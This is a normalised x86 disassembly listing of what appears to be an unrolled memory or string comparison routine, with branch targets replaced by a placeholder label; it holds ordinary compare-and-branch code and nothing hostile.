sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_10021a46 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
